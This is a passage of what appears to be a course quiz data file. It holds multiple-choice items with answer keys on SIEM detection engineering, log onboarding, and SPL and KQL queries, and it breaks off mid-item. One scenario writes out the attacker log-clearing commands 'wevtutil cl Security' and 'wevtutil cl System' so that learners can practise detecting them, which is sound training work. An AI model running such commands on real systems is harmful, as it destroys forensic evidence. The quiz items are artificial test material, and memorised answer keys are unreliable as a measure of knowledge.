        scenario: "You want to detect: 'A user fails to log in ≥10 times within 5 minutes AND then succeeds from the SAME source IP.' (Classic brute-force success.)",
        question: "Which SIEM capability is required to express this?",
        options: [
          "A basic keyword detection rule checking for any instance of the string 'failed login' in raw logs.",
          "A dashboard panel with an auto-refresh interval of 5 minutes to display live login success rates.",
          "Stateful correlation of multiple events sharing join keys (user, src_ip) within a sliding time window.",
          "A modified retention policy that separates failed and successful authentication events into index tiers."
        ],
        correctAnswer: 2,
        explanation: "This is multi-event, multi-condition correlation: count threshold + follow-on success + shared user/src — exactly what correlation engines (Splunk ES, Sentinel analytics rules, QRadar offenses) exist for. Single keyword alerts cannot express the success-follows-failure relationship."
      },
      {
        id: "siem-q1-7",
        difficulty: "medium",
        tags: ["Log Source Health"],
        scenario: "Your 'Failed logon brute-force' rule has fired daily for months. For the last 3 days it has fired ZERO times. The SOC manager is happy ('attacks went down'). You are not.",
        question: "What is the correct first action?",
        options: [
          "Assume the attacks have stopped, close the investigation, and document the successful resolution in the weekly log.",
          "Modify the correlation query to lower the count and time thresholds, forcing the rule to trigger on lower volumes.",
          "Delete the correlation rule entirely from the production environment as it is no longer generating actionable alerts.",
          "Verify log ingestion and parsing health for the Windows Security feed; silent rules often indicate a broken pipeline."
        ],
        correctAnswer: 3,
        explanation: "Sudden silence on a historically noisy detection is a classic blind-spot indicator: a forwarder died, a parser broke after a Windows update, or a GPO disabled the audit subcategory. Always treat 'too quiet' as a P2 until proven otherwise."
      },
      {
        id: "siem-q1-8",
        difficulty: "hard",
        tags: ["Architecture", "Cloud SIEM"],
        scenario: "Your org is migrating from on-prem Splunk to Microsoft Sentinel. A skeptic claims 'cloud SIEM means we lose all our detections.'",
        question: "What is the accurate, nuanced response?",
        options: [
          "Detection logic remains portable; query syntax (SPL to KQL) and data models require translation, but intent is preserved.",
          "They are correct; cloud architectures are fundamentally different and require building all detections from scratch.",
          "Cloud SIEM solutions rely entirely on out-of-the-box vendor rules and do not support custom detection logic formats.",
          "You can directly export the SPL query configuration files from Splunk and import them into Sentinel without change."
        ],
        correctAnswer: 0,
        explanation: "Sigma-first detection engineering exists for exactly this reason. SPL and KQL are different dialects, and CIM ↔ ASIM field mapping is non-trivial, but the underlying detection IDEAS (impossible travel, LOLBin spawn, etc.) port directly. (D) is false — there is no SPL-to-KQL one-click import."
      },
      {
        id: "siem-q1-9",
        difficulty: "easy",
        tags: ["Ingestion", "Syslog"],
        scenario: "A network engineer offers two options to ship firewall logs:\n  A) UDP 514 (classic syslog)\n  B) TCP 6514 with TLS\nThe firewalls log auth events used in compliance reporting.",
        question: "Which do you choose and why?",
        options: [
          "Option A (UDP 514) because UDP has lower protocol overhead, executes faster, and requires less network firewall configuration.",
          "Option B (TCP 6514 with TLS) to guarantee delivery, prevent silent packet drops, and encrypt sensitive log content in transit.",
          "Either option because syslog transmission protocols are functionally equivalent and both meet basic compliance criteria.",
          "Neither option; configure the firewalls to send structured CSV alerts via secure email to the security team mailbox daily."
        ],
        correctAnswer: 1,
        explanation: "UDP 514 silently drops under congestion and ships plaintext. For security-relevant or compliance data, RFC 5425 syslog-over-TLS (6514) is the standard. Lost auth logs = broken detection AND audit failure."
      },
      {
        id: "siem-q1-10",
        difficulty: "medium",
        tags: ["RBAC", "Data Sensitivity"],
        scenario: "HR forwards Workday audit logs (containing salaries and PII) to the SIEM so insider-threat rules can run. A Tier 1 analyst can currently search those events.",
        question: "What's the correct control?",
        options: [
          "Stop ingesting the Workday audit logs entirely because the compliance risks of storing PII in the SIEM are too high.",
          "Allow all analysts full search access to the raw logs because restricting visibility hinders their triage efficiency.",
          "Ingest into a restricted index with RBAC, mask PII fields, and run the detection rules under a service account role.",
          "Configure the HR system to email relevant audit logs to individual Tier 1 analysts only when an active alert is raised."
        ],
        correctAnswer: 2,
        explanation: "SIEMs support index-level RBAC and field masking precisely for this — the DETECTION needs the data, but the HUMAN doesn't need the raw PII. Restricted index + masked fields + service-account searches = least privilege while preserving detection value."
      },
      {
        id: "siem-q1-11",
        difficulty: "hard",
        tags: ["Time", "Investigation"],
        scenario: "During IR, you compare two events from the same incident:\n  Firewall:  2026-06-15 08:14:22 +00:00  deny src=1.2.3.4\n  EDR:       2026-06-15 03:14:47          process.create lsass dump\nYour timeline shows the EDR event 5 hours BEFORE the firewall event, which contradicts the attack story.",
        question: "Most likely cause and fix?",
        options: [
          "The attacker has implemented anti-forensics time-stomping techniques to deliberately alter the endpoint file headers.",
          "The EDR logs local time (EST) without a TZ offset while the firewall logs UTC; normalize all timestamps to UTC at ingestion.",
          "The firewall event represents a false positive network block; delete the EDR event to align the chronological timeline.",
          "Ignore the discrepancy because small timestamp offsets do not impact the logical sequence of events in the final report."
        ],
        correctAnswer: 1,
        explanation: "Missing/implicit timezones are one of the top causes of broken IR timelines. Standard practice: every parser converts to UTC, the raw local time is preserved in a separate field for reference, and a 'clock drift' detection alerts when event_time vs ingest_time skews > 60s."
      },
      {
        id: "siem-q1-12",
        difficulty: "medium",
        tags: ["Parsing", "Field Extraction"],
        scenario: "A new SaaS app sends a single unparsed log line:\n  2026-06-15T08:14 LOGIN user=\"jdoe\" result=\"FAIL\" geo=\"IN-Bengaluru\"\nThe SIEM ingests it as one big _raw string. The 'Failed Logins' dashboard shows ZERO events from this app.",
        question: "Root cause?",
        options: [
          "The SIEM database has encountered an indexing failure and requires a service restart to rebuild the field catalog.",
          "No parser or field extraction rules exist for this source yet, meaning result=FAIL is not indexed as a searchable field.",
          "The SaaS vendor's logging engine does not capture failed authentication events, only recording successful logons.",
          "The geolocation tag contains an invalid value format which blocks the dashboard query from parsing the coordinates."
        ],
        correctAnswer: 1,
        explanation: "Field extraction is a prerequisite for everything downstream — search, dashboards, correlation. Add a sourcetype with a KV/regex extractor (or onboarding via an add-on/integration) so the SIEM tokenizes user, result, geo. Until then, the data is invisible to structured queries."
      },
      {
        id: "siem-q1-13",
        difficulty: "easy",
        tags: ["Enrichment"],
        scenario: "Your raw alert shows: 'Failed login from 185.220.101.45 for user admin.' Tier 1 has to swivel-chair to AbuseIPDB, MaxMind, and a Tor exit-node list every time.",
        question: "Which SIEM capability eliminates this swivel-chair?",
        options: [
          "Deploy multi-monitor workstations so analysts can display all threat intelligence lookup portals simultaneously.",
          "Implement a firewall policy that automatically blocks all inbound connections from foreign IP subnets and ranges.",
          "Configure automated ingest-time enrichment to append GeoIP, threat-intel, and Tor exit-node tags directly to the event.",
          "Disable the brute-force correlation rule to reduce alert volume and free up analyst time for other security tasks."
        ],
        correctAnswer: 2,
        explanation: "Enrichment (lookups, asset/identity context, threat-intel) is the single biggest lever for reducing triage time. The analyst's first 30 seconds should answer 'is this IP known-bad?' without leaving the SIEM."
      },
      {
        id: "siem-q1-14",
        difficulty: "hard",
        tags: ["Detection Engineering", "Sigma"],
        scenario: "Your team runs Splunk now and is piloting Sentinel. You have 200 detections written in raw SPL.",
        question: "Which strategy minimizes long-term cost?",
        options: [
          "Convert the library to Sigma format as the source of truth, compiling to SPL and KQL via converter tooling in Git.",
          "Maintain both the 200 SPL rules and the 200 KQL rules in parallel, manually updating each repository for every change.",
          "Standardize on a single SIEM platform immediately and decommission the pilot to avoid double rule maintenance costs.",
          "Request the engineering support teams of both SIEM vendors to translate and update the queries during the migration."
        ],
        correctAnswer: 0,
        explanation: "Sigma decouples detection LOGIC from vendor SYNTAX. The team writes once, compiles to whichever backend(s) the org runs. This is the standard answer to multi-SIEM, migrations, and vendor lock-in."
      },
      {
        id: "siem-q1-15",
        difficulty: "medium",
        tags: ["KPI", "SOC Operations"],
        scenario: "Leadership asks for ONE metric to track SIEM health on the exec dashboard.",
        question: "Which is most meaningful?",
        options: [
          "Total daily ingestion volume in terabytes, as higher ingest volume always correlates with improved visibility.",
          "True-positive rate (alert fidelity) tracked alongside MTTD and MTTR to measure actual operational response efficacy.",
          "The total number of dashboards, reports, and search queries created by the security team over the fiscal quarter.",
          "The overall license utilization percentage to ensure the organization is maximizing its financial investment."
        ],
        correctAnswer: 1,
        explanation: "EPS and dashboard counts are vanity metrics. Alert fidelity (TP / (TP + FP)) plus MTTD/MTTR directly reflect SOC effectiveness — they answer 'are we catching real threats fast?' which is the SIEM's actual job."
      }
    ]
  },
  {
    quizId: "siem-q2",
    courseId: "siem-fundamentals",
    title: "Data Onboarding & Pipeline Engineering",
    description: "Scenario quiz on bringing new log sources online without breaking detection.",
    passingScore: 75,
    timeLimit: 20,
    questions: [
      {
        id: "siem-q2-1",
        difficulty: "medium",
        tags: ["Onboarding", "Change Management"],
        scenario: "A vendor pushes a parser update for your firewall add-on. After the upgrade, three correlation rules stop firing.",
        question: "What was the missing pre-deployment step?",
        options: [
          "Stage the update in a dev/test environment, replay live data, and validate every dependent detection before production.",
          "Reboot every indexer before and after the upgrade to ensure the parser cache is refreshed across the cluster.",
          "Disable all correlation rules during the upgrade window to prevent false positives from appearing in the queue.",
          "Skip the vendor update entirely and continue running the older parser version until a stable release is available."
        ],
        correctAnswer: 0,
        explanation: "Parser changes silently rename or remove fields (action vs act, src_ip vs srcip). Every onboarding/upgrade needs a dev tier with sample replay AND a regression check of dependent saved searches/rules. Detection engineering = code; treat it with the same CI discipline."
      },
      {
        id: "siem-q2-2",
        difficulty: "easy",
        tags: ["Agent vs Agentless"],
        scenario: "You need logs from 5,000 Linux servers running mixed kernels. Some teams refuse to install agents.",
        question: "Which collection strategy is most pragmatic?",
        options: [
          "Force the agent everywhere, overriding all team objections, since agentless approaches lack adequate log fidelity.",
          "Configure all servers to forward logs via email on a nightly batch schedule to the central security team inbox.",
          "Skip all servers whose teams refuse agents and only onboard the subset of hosts that cooperate with installation.",
          "Deploy agents where allowed for richer collection; use centralized rsyslog for holdouts and document visibility gaps."
        ],
        correctAnswer: 3,
        explanation: "Real environments are hybrid. Agents give you tailing of arbitrary files, metadata, and reliable buffering. Agentless syslog covers political holdouts but is limited to what the OS already emits. Document the gap so detection authors know which hosts CAN'T see Sysmon-equivalent data."
      },
      {
        id: "siem-q2-3",
        difficulty: "hard",
        tags: ["Cost Control", "Tiering"],
        scenario: "Your hot tier is at 95% and CFO wants 30% cost reduction. Audit shows 60% of ingest is DEBUG-level app logs that NO detection uses. Compliance requires keeping them for 1 year.",
        question: "Best approach?",
        options: [
          "Permanently delete all DEBUG-level application logs to immediately reclaim the storage space on the hot tier.",
          "Reduce all data retention across the board to 7 days to achieve the 30% cost reduction target immediately.",
          "Route DEBUG logs to a cheap data-lake (S3/ADLS) with cold-search; keep security-relevant levels in the SIEM hot tier.",
          "Migrate the entire SIEM deployment to a less expensive vendor platform to achieve the required budget reduction."
        ],
        correctAnswer: 2,
        explanation: "Tiered architecture (hot SIEM + cold data lake, e.g. Splunk Federated Search, Sentinel Basic Logs, Cribl, Chronicle) is the standard cost-control answer. Detection-relevant data stays fast; compliance/forensics data stays cheap but searchable."
      },
      {
        id: "siem-q2-4",
        difficulty: "medium",
        tags: ["AWS", "Cloud Logging"],
        scenario: "You're onboarding AWS. Available sources:\n  - CloudTrail (control-plane API calls)\n  - VPC Flow Logs (network 5-tuple)\n  - GuardDuty findings\n  - S3 server access logs",
        question: "Which is the FIRST priority for detection coverage of identity compromise (the #1 cloud risk)?",
        options: [
          "VPC Flow Logs — capture all network 5-tuple data to detect lateral movement and exfiltration across AWS.",
          "CloudTrail — every IAM action (AssumeRole, CreateUser, console login, key creation) is captured here.",
          "S3 server access logs — data exfiltration via object storage is the most common and highest-impact cloud risk.",
          "GuardDuty alone — AWS's built-in managed detection is sufficient to cover all identity-related cloud threats."
        ],
        correctAnswer: 1,
        explanation: "CloudTrail is the audit log of AWS. Identity-based attacks (compromised access keys, role assumption chains, persistence via new IAM users) are invisible without it. VPC Flow and S3 access are valuable but secondary. GuardDuty is signal, not raw evidence."
      },
      {
        id: "siem-q2-5",
        difficulty: "medium",
        tags: ["Tamper Resistance"],
        scenario: "An attacker with local admin on a Windows server runs:\n  wevtutil cl Security\n  wevtutil cl System\nThey then continue lateral movement.",
        question: "Why does your investigation still succeed?",
        options: [
          "Windows kernel enforces mandatory log integrity and refuses the wevtutil clear command on domain-joined systems.",
          "The wevtutil command only marks events as deleted but retains them in a shadow copy readable by forensic tools.",
          "Logs were forwarded to the SIEM in near-real-time before the clear; Event ID 1102 is itself a high-fidelity detection.",
          "Windows automatically rolls back log-clearing commands and restores the deleted events from a protected backup."
        ],
        correctAnswer: 2,
        explanation: "This is the entire reason we ship logs OFF the endpoint. Local logs are at the attacker's mercy; centralized SIEM copies are not. Event 1102 / 4 (log cleared) is also one of the strongest 'someone is hiding tracks' signals — alert on it with high severity."
      },
      {
        id: "siem-q2-6",
        difficulty: "hard",
        tags: ["Schema Drift", "Detection Reliability"],
        scenario: "A vendor renames a field across all events:\n  user_name → userName\nYour 47 detections referencing user_name silently stop matching. No alerts. No errors.",
        question: "What engineering practice prevents this?",
        options: [
          "Trust the vendor's update schedule and assume any field renames will be communicated via release notes on time.",
          "Schema contract tests: automated validators asserting fields exist with cardinality, plus a normalization layer for canonical names.",
          "Assign one analyst per week to manually re-check every production rule and verify field names against live data.",
          "Stop using that vendor and migrate to another provider whose data schema is guaranteed to never change fields."
        ],
        correctAnswer: 1,
        explanation: "Silent schema drift is one of the top causes of broken detection. Mitigations: (1) normalize to CIM/ECS so detections reference stable canonical fields, (2) automated 'field exists and is populated' health checks, (3) detection unit tests in CI."
      },
      {
        id: "siem-q2-7",
        difficulty: "medium",
        tags: ["EDR Integration"],
        scenario: "You onboard CrowdStrike via FDR (Falcon Data Replicator) into the SIEM. After two weeks, indexers are at 90% disk. EDR alone is 4 TB/day — half your total ingest.",
        question: "Smartest tuning approach?",
        options: [
          "Stop ingesting all EDR telemetry immediately to recover the disk space and prevent further storage overrun.",
          "Filter at the source: drop low-value DNS and innocuous process telemetry unused in detection, preserve detection EIDs.",
          "Buy additional disk capacity as needed each month to accommodate any future increases in EDR telemetry volume.",
          "Randomly sample 50% of all incoming EDR events to cut ingest volume while maintaining statistical coverage."
        ],
        correctAnswer: 1,
        explanation: "Edge filtering (Cribl, Splunk ingest actions, Logstash) is the right scalpel. Random sampling (D) breaks correlation. The discipline: every drop rule is reviewed by detection engineering AND logged in a 'what we don't ingest' register so future authors aren't blindsided."
      },
      {
        id: "siem-q2-8",
        difficulty: "easy",
        tags: ["CEF", "Standards"],
        scenario: "Three vendors ship logs in CEF (Common Event Format).",
        question: "Why does CEF matter to a SIEM team?",
        options: [
          "CEF is an encrypted transport protocol that ensures log integrity and prevents tampering during transmission.",
          "CEF is a mandatory GDPR compliance standard required for all security log collection in regulated environments.",
          "CEF defines a predictable header + key=value structure, enabling write-once parsers and clean CIM/ASIM normalization.",
          "CEF is a proprietary vendor format that locks organizations into a single SIEM ecosystem for log processing."
        ],
        correctAnswer: 2,
        explanation: "CEF (and LEEF for QRadar) reduces onboarding cost dramatically — predictable structure means write-once parsers and consistent field naming. It's the closest the industry has to a 'common security log dialect.'"
      },
      {
        id: "siem-q2-9",
        difficulty: "hard",
        tags: ["Pipeline", "Cribl/Edge Routing"],
        scenario: "You introduce an observability pipeline (Cribl) between sources and your SIEM. The architect proposes routing FULL fidelity to a cold lake and only HIGH-VALUE events to the hot SIEM.",
        question: "Main risk and how to mitigate?",
        options: [
          "Risk: a detection event is dropped from the hot path and never fires. Mitigation: inventory required events, version routing rules, run coverage diffs.",
          "No significant risk exists with this design pattern; ship the routing change to production without additional review.",
          "Risk: the pipeline introduces latency that makes Cribl too fast for real-time correlation windows to process.",
          "Risk: the cold data lake will inevitably cost more than the hot SIEM tier, eliminating all expected cost savings."
        ],
        correctAnswer: 0,
        explanation: "Pipelines are powerful but become a hidden detection layer. Treat routing rules as code: PR review, change diff vs the detection library, dev-tier replay, and a rollback plan. Otherwise a 'cost optimization' silently kills alerts."
      },
      {
        id: "siem-q2-10",
        difficulty: "medium",
        tags: ["Identity"],
        scenario: "Onboarding Azure AD sign-in logs. The detection team wants to write 'impossible travel' and 'risky sign-in' rules.",
        question: "Which Azure AD log streams are required at minimum?",
        options: [
          "SigninLogs (interactive + non-interactive), IdentityRiskEvents for ID Protection, and Audit logs for directory changes.",
          "Only Audit logs — Audit logs contain all authentication and directory change events needed for identity detections.",
          "Only the Azure Monitor activity log — it captures all sign-in attempts across the entire Azure AD tenant.",
          "Only Microsoft Defender for Identity alerts — managed detection handles all identity-based threat scenarios."
        ],
        correctAnswer: 0,
        explanation: "SigninLogs carry the who/where/how of authentication; non-interactive sign-ins are where token replay and refresh-token abuse hide. IdentityRiskEvents add Microsoft's risk scoring. Audit logs cover the persistence side (new app registrations, role assignments)."
      },
      {
        id: "siem-q2-11",
        difficulty: "medium",
        tags: ["Lookups", "Asset Context"],
        scenario: "Alerts say 'login from 10.4.7.22'. Analysts have no idea if that's a printer, a domain controller, or a CFO laptop.",
        question: "What's the standard fix?",
        options: [
          "Require all Tier 1 analysts to memorize the IP address plan and subnet assignments in the enterprise network diagram.",
          "Stop using internal RFC1918 addresses in alerts and replace all IP fields with a hash digest for anonymization.",
          "Ignore all alerts from internal source IPs as they can be assumed to be lower-priority internal management traffic.",
          "Maintain a CMDB-sourced asset lookup table in the SIEM keyed on IP/hostname, enriching every alert with context."
        ],
        correctAnswer: 3,
        explanation: "Asset context turns a noisy alert into a prioritizable one. Splunk ES Asset & Identity Framework, Sentinel Watchlists, QRadar Reference Data — every mature SIEM has this. Refresh the lookup nightly from the CMDB."
      },
      {
        id: "siem-q2-12",
        difficulty: "hard",
        tags: ["Late-Arriving Data"],
        scenario: "A cloud connector batches events and delivers them 45 minutes late. Your near-real-time correlation rule (5-minute window) NEVER fires on these events even when the pattern is clearly present.",
        question: "Root cause and correct redesign?",
        options: [
          "The correlation logic is incorrect; rewrite the rule with a different detection algorithm to handle batch delivery.",
          "Increase the rule's severity level from medium to critical, which will force the platform to process late events first.",
          "Real-time windows use ingest time, but events arrive 45 min late on event time and fall outside the window; switch to scheduled batch search.",
          "Drop the late-arriving source from the SIEM and rely on GuardDuty to compensate for the missing cloud coverage."
        ],
        correctAnswer: 2,
        explanation: "Event-time vs ingest-time is a classic gotcha. Real-time stream correlation can't see the past. For lagged sources, use scheduled/batch detections with a window that brackets typical lag (e.g. last 60 min, every 10 min) or platform features like Sentinel's near-real-time analytics with appropriate lookback."
      },
      {
        id: "siem-q2-13",
        difficulty: "medium",
        tags: ["DNS"],
        scenario: "You're choosing what DNS telemetry to onboard. Options: (a) DNS server query logs, (b) endpoint DNS (Sysmon EID 22 / EDR), (c) passive DNS at the resolver.",
        question: "For detecting C2 beacons and DGA traffic from a single endpoint, what's the highest-fidelity source?",
        options: [
          "Passive DNS at the resolver — aggregated org-wide view provides the broadest coverage across all endpoints.",
          "DNS server query logs — the authoritative server has the most complete record of all queries in the environment.",
          "DHCP logs — lease assignments link IP addresses to hostnames, indirectly identifying which host made the query.",
          "Endpoint DNS via Sysmon EID 22 or EDR — attributes each query to the exact process and host making it."
        ],
        correctAnswer: 3,
        explanation: "Server/resolver DNS knows the host but not the process. Endpoint DNS attributes the query to the specific process making it — essential for proving 'powershell.exe queried evil.com' rather than 'something on host01 did.' Best practice: collect both."
      },
      {
        id: "siem-q2-14",
        difficulty: "hard",
        tags: ["Detection Reliability", "Testing"],
        scenario: "You're proposing a 'detection-as-code' workflow: rules live in Git, PRs run automated tests, deployment via CI.",
        question: "Which test type catches the MOST production breakage cheaply?",
        options: [
          "Replay tests: run known-malicious and known-benign events through the full parser+detection pipeline in CI to catch regressions.",
          "Lint YAML/Sigma syntax only — catching schema violations early prevents the majority of production failures.",
          "Manual peer review for all PRs — human review catches logical errors that automated tests consistently miss.",
          "Monitor alerts in production only after deployment and roll back if the rule fires unexpectedly on benign data."
        ],
        correctAnswer: 0,
        explanation: "Replay/'fixture' tests are the industry's highest-ROI safeguard — they catch parser drift, field renames, AND logic regressions in one shot. Linting catches syntax. Peer review and prod monitoring matter but don't substitute for objective behavioral tests."
      },
      {
        id: "siem-q2-15",
        difficulty: "medium",
        tags: ["Compliance", "PCI/GDPR"],
        scenario: "Compliance asks: 'Can you prove logs were not tampered with between source and SIEM?'",
        question: "Strongest technical answer?",
        options: [
          "Informally assure the auditor that internal processes and trusted staff make tampering practically impossible.",
          "Lock the physical server room hosting the SIEM infrastructure and restrict key-card access to the security team.",
          "Create a monthly tape backup of raw log files that can be compared against the SIEM data upon request.",
          "TLS in transit + WORM/immutable storage + admin role audit trail on all SIEM access, combined with source-side log signing."
        ],
        correctAnswer: 3,
        explanation: "PCI/SOX/GDPR ask about integrity and access control. The defensible answer chains: transport encryption, immutable storage (S3 Object Lock, Splunk frozen WORM, Azure immutable blobs), and admin auditing — so any tamper attempt is detectable AND attributable."
      }
    ]
  },
  {
    quizId: "siem-q3",
    courseId: "siem-fundamentals",
    title: "SPL & KQL in the Trenches",
    description: "Hands-on scenario quiz: write and read the queries you'll use every shift.",
    passingScore: 75,
    timeLimit: 25,
    questions: [
      {
        id: "siem-q3-1",
        difficulty: "medium",
        tags: ["SPL", "Brute Force"],
        scenario: "Investigating a possible brute force against Windows accounts in the last hour. You want: top 10 (user, src_ip) pairs by failed logon count, only pairs with ≥ 20 failures.",
        question: "Which SPL is correct?",
        options: [
          "index=wineventlog EventCode=4624 earliest=-1h | stats count by user src_ip | where count>=20 | sort -count | head 10",
          "index=wineventlog EventCode=4625 | stats values(user) by src_ip | where count>=20 | sort -count | head 10",
          "index=wineventlog EventCode=4625 earliest=-1h | stats count by user src_ip | where count>=20 | sort -count | head 10",
          "index=* EventCode=4625 earliest=-1h | stats count by user src_ip | filter count>=20 | limit 10"
        ],
        correctAnswer: 2,
        explanation: "The correct SPL (C) filters for EventCode 4625 (failed logon) within the last hour, aggregates by user and src_ip, filters for count >= 20, sorts descending, and returns the top 10. (A) uses 4624 (success). (B) lacks the time filter. (D) uses invalid 'filter' and 'limit' commands."
      },
      {
        id: "siem-q3-2",
        difficulty: "medium",
        tags: ["KQL", "Sentinel", "Impossible Travel"],
        scenario: "Sentinel — for each user in the last 24h, you want the count of DISTINCT countries they signed in from, surfacing users with > 2 countries.",
        question: "Which KQL is correct?",
        options: [
          "SigninLogs | where TimeGenerated > ago(24h) | summarize Countries = dcount(LocationDetails.countryOrRegion) by UserPrincipalName | where Countries > 2",
          "SigninLogs | summarize Countries = dcount(LocationDetails.countryOrRegion) by UserPrincipalName | where Countries > 2",
          "SigninLogs | where TimeGenerated > ago(24h) | summarize Countries = count(LocationDetails.countryOrRegion) by UserPrincipalName | where Countries > 2",
          "SigninLogs | project UserPrincipalName, LocationDetails.countryOrRegion | distinct LocationDetails.countryOrRegion | where count() > 2"
        ],
        correctAnswer: 0,
        explanation: "The correct KQL (A) applies a time filter first to limit scanned volume, aggregates by the distinct count of countries (dcount), and filters for counts > 2. (B) lacks the critical 24h time filter. (C) uses non-distinct count. (D) is syntactically invalid."
      },
      {
        id: "siem-q3-3",
        difficulty: "hard",
        tags: ["SPL", "Performance"],
        scenario: "A search is slow:\n  index=* sourcetype=* user=jdoe earliest=-7d | stats count\nDaily ingest is 5 TB across 40 sourcetypes; jdoe appears in only 2 of them.",
        question: "Biggest single performance win?",
        options: [
          "Run the search daily at midnight during low-utilization windows and output the aggregated results to a lookup table.",
          "Replace index=* sourcetype=* with specific indexes and sourcetypes where the user field is a schema-extracted field.",
          "Append the '| head 1' command to the end of the query to stop indexer disk scanning immediately after the first match.",
          "Append the '| fields user count' command right after the index and sourcetype search terms to reduce search memory footprint."
        ],
        correctAnswer: 1,
        explanation: "Pruning search buckets by specifying indexes and sourcetypes (B) yields the biggest performance win by limiting raw disk I/O. (A) doesn't optimize the search itself. (C) and (D) process all data before filtering or limiting."
      },
      {
        id: "siem-q3-4",
        difficulty: "medium",
        tags: ["KQL", "join"],
        scenario: "You need to find users who had a failed sign-in AND a successful sign-in from the SAME IP within 10 minutes (brute-force success).",
        question: "Which KQL pattern is appropriate?",
        options: [
          "SigninLogs | where ResultType != 0 | summarize Failed = count() by UserPrincipalName, IPAddress | where Failed > 1",
          "SigninLogs | project UserPrincipalName, IPAddress, ResultType | distinct UserPrincipalName, IPAddress",
          "Two separate searches displayed on a dashboard side-by-side, requiring the analyst to manually eyeball matching IPs.",
          "SigninLogs | where ResultType != 0 | project user=UserPrincipalName, ip=IPAddress, failTime=TimeGenerated | join kind=inner (SigninLogs | where ResultType == 0 | project user=UserPrincipalName, ip=IPAddress, successTime=TimeGenerated) on user, ip | where successTime between (failTime .. failTime + 10m)"
        ],
        correctAnswer: 3,
        explanation: "An inner join on user and IPAddress, followed by a time window predicate (D), correlates failures and successes. (A) and (B) do not establish sequence or time correlation. (C) is inefficient and manual."
      },
      {
        id: "siem-q3-5",
        difficulty: "hard",
        tags: ["SPL", "Stats vs Transaction"],
        scenario: "You want to group all events of a user session (logon → activity → logoff) and compute session duration.",
        question: "Which approach scales better on a 50 GB/day index?",
        options: [
          "stats with min(_time) and max(_time) by session_key (e.g., LogonID), then eval duration = max - min",
          "transaction user maxspan=8h startswith=eval(EventCode=4624) endswith=eval(EventCode=4634)",
          "Run a map command to execute a subsearch for each individual user session to compute durations sequentially",
          "Use index=wineventlog | streamstats window=2 current=f values(_time) as prev_time | eval duration = _time - prev_time"
        ],
        correctAnswer: 0,
        explanation: "The 'stats' command (A) is distributable across search peers and uses far less memory than 'transaction' (B), which groups events on a single search head and does not scale well on large datasets."
      },
      {
        id: "siem-q3-6",
        difficulty: "easy",
        tags: ["SPL"],
        scenario: "You write:\n  index=web | stats count by status\nresult shows just '200, 301, 404'. Your colleague wants the count visible too in a clean table.",
        question: "Minimal correct addition?",
        options: [
          "Append the '| chart count by status' command to dynamically group and display counts in a horizontal bar graph.",
          "Append the '| sort status' command to order the existing results alphabetically by status value.",
          "Append the '| table status count' command to explicitly specify the column layout and display both fields.",
          "Append the '| eval count=1' command to assign a static value to the count field for table visualization."
        ],
        correctAnswer: 2,
        explanation: "The 'table' command (C) selects and formats the columns for display in the UI. (A) changes visualization format rather than simple table layout. (B) only reorders rows. (D) overwrites the aggregated count."
      },
      {
        id: "siem-q3-7",
        difficulty: "medium",
        tags: ["KQL", "Time"],
        scenario: "You want sign-ins from the last 7 days, bucketed by HOUR, separated by Result (Success/Failure), for a time-series chart.",
        question: "Correct KQL?",
        options: [
          "SigninLogs | where TimeGenerated > ago(7d) | project TimeGenerated, ResultType | summarize count() by bin(TimeGenerated, 1h)",
          "SigninLogs | summarize Count = count() by bin(TimeGenerated, 1h), Result = iff(ResultType == 0, 'Success', 'Failure')",
          "SigninLogs | where TimeGenerated > ago(7d) | summarize Count = count() by bin(TimeGenerated, 1h), Result = iff(ResultType == 0, 'Success', 'Failure') | render timechart",
          "SigninLogs | where TimeGenerated > now() | summarize Count = count() by bin(TimeGenerated, 1h) | render timechart"
        ],
        correctAnswer: 2,
        explanation: "Using 'bin' for 1-hour intervals, 'iff' to label success/failure, and 'render timechart' (C) creates the time-series chart. (A) lacks the result splitter and timechart rendering. (B) lacks the time filter. (D) uses an invalid future time boundary."
      },
      {
        id: "siem-q3-8",
        difficulty: "hard",
        tags: ["SPL", "Lookups", "Enrichment"],
        scenario: "You maintain a CSV lookup 'threat_ips.csv' with columns ip, score, source. You want to enrich every proxy event with the threat score and filter to score > 80.",
        question: "Correct SPL?",
        options: [
          "index=proxy | join ip [search inputlookup threat_ips.csv] | where score > 80",
          "index=proxy | lookup threat_ips.csv ip OUTPUT score source | where score > 80",
          "index=proxy AND [| inputlookup threat_ips.csv | where score > 80 | fields ip]",
          "index=proxy | inputlookup threat_ips.csv append=true | where score > 80"
        ],
        correctAnswer: 1,
        explanation: "The 'lookup' command (B) efficiently enriches events in-flight using lookup tables. (A) is slow and memory-intensive due to join limitations. (C) uses subsearches incorrectly. (D) appends lookup data as separate events."
      },
      {
        id: "siem-q3-9",
        difficulty: "medium",
        tags: ["KQL", "extend/project"],
        scenario: "You need to compute a derived field RiskTag = 'high' when failed sign-ins > 50 else 'low', per user.",
        question: "Which KQL is right?",
        options: [
          "SigninLogs | where ResultType != 0 | summarize Failed = count() by UserPrincipalName | where Failed > 50",
          "SigninLogs | summarize Failed = countif(ResultType != 0) by UserPrincipalName | project UserPrincipalName, RiskTag = 'high'",
          "SigninLogs | where ResultType != 0 | summarize Failed = count() by UserPrincipalName | extend RiskTag = iff(Failed > 50, 'high', 'low')",
          "SigninLogs | extend RiskTag = iff(count() > 50, 'high', 'low') by UserPrincipalName"
        ],
        correctAnswer: 2,
        explanation: "First filter to failures and aggregate count by user, then use 'extend' with 'iff' to assign the conditional tag (C). (A) filters out 'low' risk users completely. (B) tags all users as high risk. (D) is syntactically invalid."
      },
      {
        id: "siem-q3-10",
        difficulty: "hard",
        tags: ["SPL", "Anomaly"],
        scenario: "You want to detect users whose data egress today is anomalously high vs their own 14-day baseline (z-score > 3).",
        question: "Which SPL approach is correct?",
        options: [
          "Build a 14-day per-user baseline with stats avg, stdev; outer-join today's per-user sum; compute z = (today - avg) / stdev; alert where z > 3.",
          "Calculate the overall daily network egress average across the whole company, and alert on any user exceeding 10 GB.",
          "Run a daily search for the top 10 users by bytes transferred, and automatically block their network access.",
          "Compare today's data egress against yesterday's egress for each user and alert if the difference is greater than 50%."
        ],
        correctAnswer: 0,
        explanation: "Using standard deviation and mean on a per-user historical baseline (A) accounts for individual baseline variability. Static global thresholds (B) generate false positives for high-throughput roles, and top 10 reports (C) aren't behavioral baselines."
      },
      {
        id: "siem-q3-11",
        difficulty: "medium",
        tags: ["SPL", "Subsearch"],
        scenario: "You want all events from src_ip values that already triggered the 'high-risk' alert today (a small set — < 100 IPs).",
        question: "Which is correct AND efficient?",
        options: [
          "index=network | join src_ip [search index=alerts severity=high earliest=@d | fields src_ip]",
